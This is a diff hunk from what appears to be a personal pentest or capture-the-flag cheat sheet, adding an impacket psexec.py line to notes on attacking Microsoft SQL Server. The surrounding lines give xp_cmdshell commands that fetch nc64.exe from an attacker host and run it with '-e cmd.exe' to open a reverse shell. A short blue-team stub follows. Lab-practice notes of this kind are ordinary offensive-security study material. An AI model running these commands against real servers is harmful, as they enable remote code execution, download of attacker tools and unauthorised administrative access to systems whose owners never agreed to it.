@@ -578,6 +578,7 @@ RECONFIGURE;`
  - Make the victim download `https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------`
  -`xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.22/nc64.exe -outfile nc64.exe"` OR `xp_cmdshell "powershell -c Invoke-WebRequest -Uri \"http://10.10.14.22:80/nc64.exe \" -OutFile \"C:\Users\sql_svc\Downloads\n.exe\""`
  - Listen on ur machine and on victim `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.129.113.162 443"`
+ - Windows ssh like access `python3 psexec.py administrator@10.129.113.162` impacket tool
 
 # Blue team notes
  - yara <path to specific yara rule file> target
